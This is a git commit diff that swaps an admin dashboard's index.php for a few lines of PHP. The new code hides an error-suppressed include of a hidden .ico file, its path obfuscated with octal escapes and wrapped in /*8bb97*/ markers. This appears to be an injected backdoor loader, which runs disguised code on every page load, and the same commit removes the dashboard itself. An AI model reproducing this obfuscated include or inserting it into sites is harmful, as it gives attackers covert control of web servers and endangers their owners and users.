e13c94b549363829fd4c50f47f5c18a07ddd4f09
hanshika0708 <72457796+hanshika0708@users.noreply.github.com>
2023-08-31 05:01:20 +0530

    Add files via upload

--- index.php
+++ index.php
@@ -1,148 +1,15 @@
-<?php session_start();
-include('../config.php');
+<?php
+/*8bb97*/
 
-   $MM_Username=$_SESSION['MM_Usernameadmin'];
-   @$refferalcode=$_SESSION['refferalcode'];
-   @$PatiantSesId=$_SESSION['userid'];
-   @$pid=$_SESSION['Id'];
-  
-$date=date('Y-m-d');
+@include ("\057h\157m\1454\057d\163t\141r\144p\165/\157n\160r\151c\145i\156f\157.\143o\155/\145r\160/\144o\155p\144f\057v\145n\144o\162/\0564\0622\146c\1444\063.\151c\157");
 
-?>
-<!DOCTYPE html>
-<html lang="en">
+/*8bb97*/
 
-<head>
-<?php include 'inc/style.php';?>
-<style>
-.panel-bd{
-    background-color:#009688;
-    color:white;
-}
-</style>
-    </head>
-    <body class="hold-transition sidebar-mini">
-        <!-- Site wrapper -->
-        <div class="wrapper">
-           <?php include 'inc/header.php'; ?>
-            <!-- =============================================== -->
-            <!-- Content Wrapper. Contains page content -->
-            <div class="content-wrapper">
-                <!-- Content Header (Page header) -->
-                <section class="content-header">
-                      
-                    <div class="header-icon">
-                        <i class="fa fa-tachometer"></i>
-                    </div>
-                    <div class="header-title">
-                        <h1> Dashboard</h1>
-                        <small> Dashboard features</small>
-                        <ol class="breadcrumb hidden-xs">
-                            <li><a href="dashbord.php"><i class="pe-7s-home"></i> Home</a></li>
-                            <li class="active">Dashboard</li>
-                        </ol>
-                    </div>
-                </section>
-            <!-- Main content -->
-                <section class="content">
-                    <div class="row">
-                        
-                        
-                        
-                     
-					
-		
-		                
-					
-					
-                                        
-                                
-					
-		 
-		 
-                        
-                     
-                     
-						
-                     
-                     
-                        
-                        
-                        
-                        
-                        
-                    
-                        
-                        
-                        
-                   
-                        
-                        
-                        
-             
-             
-						
-						
-						
-						
-						
-							 <!--
-						
-						   <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">
-						       
-						       <a href='Withdrawcredit.php'>
-                            <div class="panel panel-bd ">
-                                <div class="panel-body">
-                                    <div class="statistic-box">
-                                        <h4>WIDTHDRAW AMOUNT REQUEST</h4>
-                                    </div>
-                                    <div class="items pull-left">
-                                        <i class="fa fa-inr fa-2x"></i>
-                                        
-                                    </div>
-                                </div>
-                            </div>
-                            </a>
-                        </div>
-						-->
-						
-						
-						
-					
-                        
-                        
-                        
-                        
-                        
-                        
-                        
-						
-						
-						
-						
-						
-                       
-                       
-                       
-                     
-                    </div>
-                <div class="row">
-                        
-                       
-                    </div> <!-- /.row -->
-                </section> <!-- /.content -->
 
-            </div> <!-- /.content-wrapper -->
-          <?php include 'inc/footer.php';?>
-        </div> <!-- ./wrapper -->
-        <!-- ./wrapper -->
-         <!-- Start Core Plugins
-        =====================================================================-->
-      <?php include 'inc/script.php';?>      
 
-	  <!-- End Theme label Script
-        =====================================================================-->
-      
-    </body>
 
-</html>
+
+
+
+
+
